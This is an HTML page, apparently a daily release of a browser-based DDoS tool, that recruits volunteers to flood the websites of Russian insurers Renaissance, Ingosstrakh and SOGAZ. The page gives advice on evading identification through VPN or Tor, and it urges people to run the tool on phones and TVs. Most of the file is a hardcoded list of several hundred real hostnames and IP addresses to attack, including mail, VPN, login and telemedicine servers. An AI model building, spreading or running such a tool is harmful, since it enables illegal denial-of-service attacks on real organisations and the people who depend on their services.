@@ -1,0 +1,1293 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 409 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 409</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or  your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+		This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p><span style="font-size:14px;"><u></u><strong>Message from the IT Army of Ukraine regarding Todays targets: </strong></span>&nbsp;<br>
+  &nbsp; &nbsp; &nbsp; Renaissance Insurance and Ingosstrakh have joined forces<br>
+  &nbsp; &nbsp; &nbsp; with SOGAZ the club "Find Our Services If You Can" and are<br>
+  &nbsp; &nbsp; &nbsp; amiably conducting technical work.<br>
+  &nbsp; &nbsp; &nbsp; Insurance, as is well known, derives from the word "fear" in<br>
+  &nbsp; &nbsp; &nbsp; Russian. So, is it worth insuring against the fear of war?<br>
+  &nbsp; &nbsp; &nbsp; Demand for this is expected to grow in the coming days,<br>
+  &nbsp; &nbsp; &nbsp; although vodka and the balalaika will be more reliable<br>
+  &nbsp; &nbsp; &nbsp; than these Western capitalist inventions of yours.
+<span style="font-size:14px;"><u></u><strong><br>
+		Additional message for newly added targets:<em>&nbsp;</em>&nbsp;<br></strong>
+  &nbsp; &nbsp; &nbsp; The Russian Alfastrakh insurance company is not working, claiming</a><br>
+  &nbsp; &nbsp; &nbsp; that the internet has run out. It's the karmic fate of the aggressor's<br>
+  &nbsp; &nbsp; &nbsp; insurance business. It's a pity that there's no electricity, but considering<br>
+  &nbsp; &nbsp; &nbsp; the direction of their country's movement, it's only a matter of time.<br>
+  &nbsp; &nbsp; &nbsp; Well done, ITtackers, great shot!
+    </div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 409 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day409.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //Renaissance Insurance and Ingosstrakh have joined forces with SOGAZ the club "Find Our Services If You Can" and are amiably conducting technical work. Insurance, as is well known, derives from the word "fear" in Russian. So, is it worth insuring against the fear of war? Demand for this is expected to grow in the coming days, although vodka and the balalaika will be more reliable than these Western capitalist inventions of yours.
+        //renins.ru Targets
+		    'http://renins.ru',
+		    'http://beta.renins.ru',
+		    'http://www.stopcovid.renins.ru',
+		    'http://kirov.renins.ru',
+		    'http://mail.renins.ru',
+		    'http://files-rh.renins.ru',
+		    'http://prod.renins.ru',
+		    'http://yar.renins.ru',
+		    'http://life.renins.ru',
+		    'http://test-eosagof.renins.ru',
+		    'http://smr.renins.ru',
+		    'http://tver.renins.ru',
+		    'http://iris.renins.ru',
+		    'http://ns1.renins.ru',
+		    'http://ns2.renins.ru',
+		    'http://mx1.renins.ru',
+		    'http://mx2.renins.ru',
+		    'http://mx3.renins.ru',
+		    'http://mx4.renins.ru',
+		    'http://ipoteka-test.renins.ru',
+		    'http://vpn.renins.ru',
+		    'http://stg.www.renins.ru',
+		    'http://promo.renins.ru',
+		    'http://www.renins.ru',
+		    'http://b2b.renins.ru',
+		    'http://brand.renins.ru',
+		    'http://lk.renins.ru',
+		    'http://eosagof.renins.ru',
+		    'http://eosagou.renins.ru',
+		    'http://www.invest.renins.ru',
+		    'http://nssport.renins.ru',
+		    'http://telematics.renins.ru',
+		    'http://stg.renins.ru',
+		    'http://invest.renins.ru',
+		    'http://185.43.7.181:80',
+		    'http://194.190.22.142:80',
+		    'http://194.190.22.81:80',
+		    'http://194.190.22.105:80',
+		    'https://renins.ru',
+		    'https://beta.renins.ru',
+		    'https://www.stopcovid.renins.ru',
+		    'https://kirov.renins.ru',
+		    'https://mail.renins.ru',
+		    'https://files-rh.renins.ru',
+		    'https://prod.renins.ru',
+		    'https://yar.renins.ru',
+		    'https://life.renins.ru',
+		    'https://test-eosagof.renins.ru',
+		    'https://smr.renins.ru',
+		    'https://tver.renins.ru',
+		    'https://iris.renins.ru',
+		    'https://ns1.renins.ru',
+		    'https://ns2.renins.ru',
+		    'https://mx1.renins.ru',
+		    'https://mx2.renins.ru',
+		    'https://mx3.renins.ru',
+		    'https://mx4.renins.ru',
+		    'https://ipoteka-test.renins.ru',
+		    'https://vpn.renins.ru',
+		    'https://stg.www.renins.ru',
+		    'https://promo.renins.ru',
+		    'https://www.renins.ru',
+		    'https://b2b.renins.ru',
+		    'https://brand.renins.ru',
+		    'https://lk.renins.ru',
+		    'https://eosagof.renins.ru',
+		    'https://eosagou.renins.ru',
+		    'https://www.invest.renins.ru',
+		    'https://nssport.renins.ru',
+		    'https://telematics.renins.ru',
+		    'https://stg.renins.ru',
+		    'https://invest.renins.ru',
+		    'https://194.190.22.105:443',
+		    'https://194.190.22.142:443',
+		    'https://185.43.7.181:443',
+        //ingos.ru Targets
+		    'http://ingos.ru',
+		    'http://sip.ingos.ru',
+		    'http://armsrv.ingos.ru',
+		    'http://b-lns1.ingos.ru',
+		    'http://eng.ingos.ru',
+		    'http://ssostage.ingos.ru',
+		    'http://ingogate.ingos.ru',
+		    'http://ratsp.ingos.ru',
+		    'http://blackfriday.ingos.ru',
+		    'http://iagent7.ingos.ru',
+		    'http://m.ingos.ru',
+		    'http://edo.ingos.ru',
+		    'http://www.bmpdfs.ingos.ru',
+		    'http://ageicheva.50.ingos.ru',
+		    'http://backoffice.ingos.ru',
+		    'http://esia.ingos.ru',
+		    'http://ingogate-demo.ingos.ru',
+		    'http://kalinovskiy.77.ingos.ru',
+		    'http://app.ingos.ru',
+		    'http://imc.ingos.ru',
+		    'http://msln-netca.ingos.ru',
+		    'http://test.wwwt.ingos.ru',
+		    'http://www.trueconf.ingos.ru',
+		    'http://meet.ingos.ru',
+		    'http://2019.ingos.ru',
+		    'http://av.ingos.ru',
+		    'http://login200-snx.ingos.ru',
+		    'http://test-m-sgate.ingos.ru',
+		    'http://aisws.ingos.ru',
+		    'http://www3.ingos.ru',
+		    'http://beta.ingos.ru',
+		    'http://kbm.ingos.ru',
+		    'http://www.bonus.ingos.ru',
+		    'http://www.ms.ingos.ru',
+		    'http://games.ingos.ru',
+		    'http://fwreporter.ingos.ru',
+		    'http://mobile.ingos.ru',
+		    'http://test.www.ingos.ru',
+		    'http://wg2.ingos.ru',
+		    'http://wsm.ingos.ru',
+		    'http://www.m-sgate.ingos.ru',
+		    'http://bolshoi.ingos.ru',
+		    'http://agent.ingos.ru',
+		    'http://aisws-test.ingos.ru',
+		    'http://maskaev.77.ingos.ru',
+		    'http://wwwt.ingos.ru',
+		    'http://ingos-gost.ingos.ru',
+		    'http://portal.mlogin.ingos.ru',
+		    'http://login2.ingos.ru',
+		    'http://bonus.ingos.ru',
+		    'http://aisrca.ingos.ru',
+		    'http://www2.ingos.ru',
+		    'http://fwcp.ingos.ru',
+		    'http://h1.ingos.ru',
+		    'http://old.ingos.ru',
+		    'http://m-sgate.ingos.ru',
+		    'http://time2change.70.ingos.ru',
+		    'http://static.ingos.ru',
+		    'http://iagent6.ingos.ru',
+		    'http://tech.ingos.ruquiz23febr.ingos.ru',
+		    'http://agibalova.77.ingos.ru',
+		    'http://test-gate.ingos.ru',
+		    'http://iagent4.ingos.ru',
+		    'http://r-ext1.ingos.ru',
+		    'http://re1.ingos.ru',
+		    'http://waf-webaudit.ingos.ru',
+		    'http://audit.ingos.ru',
+		    'http://partner2.ingos.ru',
+		    'http://www.exclusive.ingos.ru',
+		    'http://cdn.ingos.ru',
+		    'http://www.ftp.ingos.ru',
+		    'http://fwmng.ingos.ru',
+		    'http://agency-test.ingos.ru',
+		    'http://ingos.ingos.ru',
+		    'http://iagent1.ingos.ru',
+		    'http://ftp.ingos.ru',
+		    'http://www.sip.ingos.ru',
+		    'http://bmpdfs.ingos.ru',
+		    'http://exclusive.ingos.ru',
+		    'http://idscust55.mlogin.ingos.ru',
+		    'http://birthday69.ingos.ru',
+		    'http://owaextweb.ingos.ru',
+		    'http://m3.ingos.ru',
+		    'http://iagent5.ingos.ru',
+		    'http://ravpn-test.ingos.ru',
+		    'http://http://agency.ingos.ru',
+		    'http://sokolovas.77.ingos.ru',
+		    'http://mrsa.ingos.ru',
+		    'http://mlogin3.ingos.ru',
+		    'http://msln-ca01.corp.ingos.ru',
+		    'http://adfs.ingos.ru',
+		    'http://2016.ingos.ru',
+		    'http://buzunova.77.ingos.ru',
+		    'http://h2.ingos.ru',
+		    'http://r-ext2.ingos.ru',
+		    'http://lk.ingos.ru',
+		    'http://partner.ingos.ru',
+		    'http://www.test-m-sgate.ingos.ru',
+		    'http://ingolab.ingos.ru',
+		    'http://wg1.ingos.ru',
+		    'http://iagent8.ingos.ru',
+		    'http://ravpn-ext7730.ingos.ru',
+		    'http://rtu-gate.ingos.ru',
+		    'http://vmailv2.97.ingos.ru',
+		    'http://m2.ingos.ru',
+		    'http://www.ingos.ru',
+		    'http://ovsyannikova.77.ingos.ru',
+		    'http://login300.ingos.ru',
+		    'http://login200.ingos.ru',
+		    'http://itopenday.ingos.ru',
+		    'http://www.70.ingos.ru',
+		    'http://r.ingos.ru',
+		    'http://garibaldi.77.ingos.ru',
+		    'http://www.cdn.ingos.ru',
+		    'http://pay.ingos.ru',
+		    'http://ms.ingos.ru',
+		    'http://h3.ingos.ru',
+		    'http://www.mlogin3.ingos.ru',
+		    'http://card.ingos.ru',
+		    'http://new.ingos.ru',
+		    'http://sochi2014.ingos.ru',
+		    'http://sso.ingos.ru',
+		    'http://www.partner.ingos.ru',
+		    'http://skypeweb.ingos.ru',
+		    'http://mlogin2.ingos.ru',
+		    'http://helpdesk-dev.ingos.ru',
+		    'http://site.ingos.ru',
+		    'http://www.partner2.ingos.ru',
+		    'http://dialin.ingos.ru',
+		    'http://fx.ingos.ru',
+		    'http://login.ingos.ru',
+		    'http://study.ingos.ru',
+		    'http://mlogin.ingos.ru',
+		    'http://ru-k.mlogin.ingos.ru',
+		    'http://m1.ingos.ru',
+		    'http://backoffice-test.ingos.ru',
+		    'http://dev.ingos.ru',
+		    'http://login300-snx.ingos.ru',
+		    'http://login50.ingos.ru',
+		    'http://70.ingos.ru',
+		    'http://www1.ingos.ru',
+		    'http://trueconf.ingos.ru',
+		    'http://push-site.ingos.ru',
+		    'http://wc.ingos.ru',
+		    'http://krasnov.50.ingos.ru',
+		    'http://ns1.ingos.ru',
+		    'http://ns2.ingos.ru',
+		    'http://www.ingos.ru',
+		    'http://vasily.ingos.ru',
+		    'http://sber.ingos.ru',
+		    'https://ingos.ru',
+		    'https://sip.ingos.ru',
+		    'https://armsrv.ingos.ru',
+		    'https://b-lns1.ingos.ru',
+		    'https://eng.ingos.ru',
+		    'https://ssostage.ingos.ru',
+		    'https://ingogate.ingos.ru',
+		    'https://ratsp.ingos.ru',
+		    'https://blackfriday.ingos.ru',
+		    'https://iagent7.ingos.ru',
+		    'https://m.ingos.ru',
+		    'https://edo.ingos.ru',
+		    'https://www.bmpdfs.ingos.ru',
+		    'https://ageicheva.50.ingos.ru',
+		    'https://backoffice.ingos.ru',
+		    'https://esia.ingos.ru',
+		    'https://ingogate-demo.ingos.ru',
+		    'https://kalinovskiy.77.ingos.ru',
+		    'https://app.ingos.ru',
+		    'https://imc.ingos.ru',
+		    'https://msln-netca.ingos.ru',
+		    'https://test.wwwt.ingos.ru',
+		    'https://www.trueconf.ingos.ru',
+		    'https://meet.ingos.ru',
+		    'https://2019.ingos.ru',
+		    'https://av.ingos.ru',
+		    'https://login200-snx.ingos.ru',
+		    'https://test-m-sgate.ingos.ru',
+		    'https://aisws.ingos.ru',
+		    'https://www3.ingos.ru',
+		    'https://beta.ingos.ru',
+		    'https://kbm.ingos.ru',
+		    'https://www.bonus.ingos.ru',
+		    'https://www.ms.ingos.ru',
+		    'https://games.ingos.ru',
+		    'https://fwreporter.ingos.ru',
+		    'https://mobile.ingos.ru',
+		    'https://test.www.ingos.ru',
+		    'https://wg2.ingos.ru',
+		    'https://wsm.ingos.ru',
+		    'https://www.m-sgate.ingos.ru',
+		    'https://bolshoi.ingos.ru',
+		    'https://agent.ingos.ru',
+		    'https://aisws-test.ingos.ru',
+		    'https://maskaev.77.ingos.ru',
+		    'https://wwwt.ingos.ru',
+		    'https://ingos-gost.ingos.ru',
+		    'https://portal.mlogin.ingos.ru',
+		    'https://login2.ingos.ru',
+		    'https://bonus.ingos.ru',
+		    'https://aisrca.ingos.ru',
+		    'https://www2.ingos.ru',
+		    'https://fwcp.ingos.ru',
+		    'https://h1.ingos.ru',
+		    'https://old.ingos.ru',
+		    'https://m-sgate.ingos.ru',
+		    'https://time2change.70.ingos.ru',
+		    'https://static.ingos.ru',
+		    'https://iagent6.ingos.ru',
+		    'https://tech.ingos.ruquiz23febr.ingos.ru',
+		    'https://agibalova.77.ingos.ru',
+		    'https://test-gate.ingos.ru',
+		    'https://iagent4.ingos.ru',
+		    'https://r-ext1.ingos.ru',
+		    'https://re1.ingos.ru',
+		    'https://waf-webaudit.ingos.ru',
+		    'https://audit.ingos.ru',
+		    'https://partner2.ingos.ru',
+		    'https://www.exclusive.ingos.ru',
+		    'https://cdn.ingos.ru',
+		    'https://www.ftp.ingos.ru',
+		    'https://fwmng.ingos.ru',
+		    'https://agency-test.ingos.ru',
+		    'https://ingos.ingos.ru',
+		    'https://iagent1.ingos.ru',
+		    'https://ftp.ingos.ru',
+		    'https://www.sip.ingos.ru',
+		    'https://bmpdfs.ingos.ru',
+		    'https://exclusive.ingos.ru',
+		    'https://idscust55.mlogin.ingos.ru',
+		    'https://birthday69.ingos.ru',
+		    'https://owaextweb.ingos.ru',
+		    'https://m3.ingos.ru',
+		    'https://iagent5.ingos.ru',
+		    'https://ravpn-test.ingos.ru',
+		    'https://http://agency.ingos.ru',
+		    'https://sokolovas.77.ingos.ru',
+		    'https://mrsa.ingos.ru',
+		    'https://mlogin3.ingos.ru',
+		    'https://msln-ca01.corp.ingos.ru',
+		    'https://adfs.ingos.ru',
+		    'https://2016.ingos.ru',
+		    'https://buzunova.77.ingos.ru',
+		    'https://h2.ingos.ru',
+		    'https://r-ext2.ingos.ru',
+		    'https://lk.ingos.ru',
+		    'https://partner.ingos.ru',
+		    'https://www.test-m-sgate.ingos.ru',
+		    'https://ingolab.ingos.ru',
+		    'https://wg1.ingos.ru',
+		    'https://iagent8.ingos.ru',
+		    'https://ravpn-ext7730.ingos.ru',
+		    'https://rtu-gate.ingos.ru',
+		    'https://vmailv2.97.ingos.ru',
+		    'https://m2.ingos.ru',
+		    'https://www.ingos.ru',
+		    'https://ovsyannikova.77.ingos.ru',
+		    'https://login300.ingos.ru',
+		    'https://login200.ingos.ru',
+		    'https://itopenday.ingos.ru',
+		    'https://www.70.ingos.ru',
+		    'https://r.ingos.ru',
+		    'https://garibaldi.77.ingos.ru',
+		    'https://www.cdn.ingos.ru',
+		    'https://pay.ingos.ru',
+		    'https://ms.ingos.ru',
+		    'https://h3.ingos.ru',
+		    'https://www.mlogin3.ingos.ru',
+		    'https://card.ingos.ru',
+		    'https://new.ingos.ru',
+		    'https://sochi2014.ingos.ru',
+		    'https://sso.ingos.ru',
+		    'https://www.partner.ingos.ru',
+		    'https://skypeweb.ingos.ru',
+		    'https://mlogin2.ingos.ru',
+		    'https://helpdesk-dev.ingos.ru',
+		    'https://site.ingos.ru',
+		    'https://www.partner2.ingos.ru',
+		    'https://dialin.ingos.ru',
+		    'https://fx.ingos.ru',
+		    'https://login.ingos.ru',
+		    'https://study.ingos.ru',
+		    'https://mlogin.ingos.ru',
+		    'https://ru-k.mlogin.ingos.ru',
+		    'https://m1.ingos.ru',
+		    'https://backoffice-test.ingos.ru',
+		    'https://dev.ingos.ru',
+		    'https://login300-snx.ingos.ru',
+		    'https://login50.ingos.ru',
+		    'https://70.ingos.ru',
+		    'https://www1.ingos.ru',
+		    'https://trueconf.ingos.ru',
+		    'https://push-site.ingos.ru',
+		    'https://wc.ingos.ru',
+		    'https://krasnov.50.ingos.ru',
+		    'https://ns1.ingos.ru',
+		    'https://ns2.ingos.ru',
+		    'https://www.ingos.ru',
+		    'https://vasily.ingos.ru',
+		    'https://sber.ingos.ru',
+		    'https://51.250.52.46:443',
+		    'https://77.108.96.90:443',
+        //sogaz.ru Targets
+		    'http://sogaz.ru',
+		    'http://www.adinsure.sogaz.ru',
+		    'http://bot2.sogaz.ru',
+		    'http://http://ft.sogaz.ru',
+		    'http://fop.sogaz.ru',
+		    'http://promo.sogaz.ru',
+		    'http://en.sogaz.ru',
+		    'http://ice-01.telemed.sogaz.ru',
+		    'http://doctor.telemed.sogaz.ru',
+		    'http://www.medonline.sogaz.ru',
+		    'http://opros.sogaz.ru',
+		    'http://micore.sogaz.ru',
+		    'http://auto.sogaz.ru',
+		    'http://mcu-03.telemed.sogaz.ru',
+		    'http://kbm.sogaz.ru',
+		    'http://call.vkteams.sogaz.ru',
+		    'http://adinsure-auth.sogaz.ru',
+		    'http://mcu-01.telemed.sogaz.ru',
+		    'http://rev2.sogaz.ru',
+		    'http://stage.direct.sogaz.ru',
+		    'http://bot.sogaz.ru',
+		    'http://e.sogaz.ru',
+		    'http://adfs.sogaz.ru',
+		    'http://omnichat-test.sogaz.ru',
+		    'http://elt-api-test.sogaz.ru',
+		    'http://app.telemed.sogaz.ru',
+		    'http://www.ds-omnichat.sogaz.ru',
+		    'http://ice-02.telemed.sogaz.ru',
+		    'http://back-office.telemed.sogaz.ru',
+		    'http://admin.telemed.sogaz.ru',
+		    'http://claim.sogaz.ru',
+		    'http://medonline.sogaz.ru',
+		    'http://autodiscover.sogaz.ru',
+		    'http://www.omnichat.sogaz.ru',
+		    'http://ub.vkteams.sogaz.ru',
+		    'http://vkteams.sogaz.ru',
+		    'http://retail.sogaz.ru',
+		    'http://career.sogaz.ru',
+		    'http://admin-telemed.sogaz.ru',
+		    'http://direct.sogaz.ru',
+		    'http://dl.vkteams.sogaz.ru',
+		    'http://u.vkteams.sogaz.ru',
+		    'http://box.sogaz.ru',
+		    'http://rs6.sogaz.ru',
+		    'http://fit.sogaz.ru',
+		    'http://lk.sogaz.ru',
+		    'http://www.adinsure-auth.sogaz.ru',
+		    'http://rev1.sogaz.ru',
+		    'http://www.promo.sogaz.ru',
+		    'http://admin.vkteams.sogaz.ru',
+		    'http://di.vkteams.sogaz.ru',
+		    'http://webim.vkteams.sogaz.ru',
+		    'http://omnichat.sogaz.ru',
+		    'http://parusa.sogaz.ru',
+		    'http://ice-03.telemed.sogaz.ru',
+		    'http://corp.sogaz.ru',
+		    'http://calendar.vkteams.sogaz.ru',
+		    'http://www.mp.sogaz.ru',
+		    'http://back-office.medonline.sogaz.ru',
+		    'http://ds-omnichat.sogaz.ru',
+		    'http://pl.sogaz.ru',
+		    'http://mcu-02.telemed.sogaz.ru',
+		    'http://gpauu.sogaz.ru',
+		    'http://api.vkteams.sogaz.ru',
+		    'http://www.sogaz.ru',
+		    'http://stage.lk.sogaz.ru',
+		    'http://tm.sogaz.ru',
+		    'http://di-dark.vkteams.sogaz.ru',
+		    'http://mail2.sogaz.ru',
+		    'http://coronavirus.sogaz.ru',
+		    'http://adinsure.sogaz.ru',
+		    'http://mp.sogaz.ru',
+		    'http://adinsure-server.sogaz.ru',
+		    'http://rs5.sogaz.ru',
+		    'http://mail.sogaz.ru',
+		    'http://shop.sogaz.ru',
+		    'http://spb.sogaz.ru',
+		    'http://wbx.sogaz.ru',
+		    'http://*.sogaz.ru',
+		    'http://www.fop.sogaz.ru',
+		    'http://jira.sogaz.ru',
+		    'http://edo.sogaz.ru',
+		    'http://prepartner.sogaz.ru',
+		    'http://company.sogaz.ru',
+		    'http://185.173.80.151:80',
+		    'http://194.186.171.233:80',
+		    'http://46.229.213.245:80',
+		    'https://sogaz.ru',
+		    'https://www.adinsure.sogaz.ru',
+		    'https://bot2.sogaz.ru',
+		    'https://ft.sogaz.ru',
+		    'https://fop.sogaz.ru',
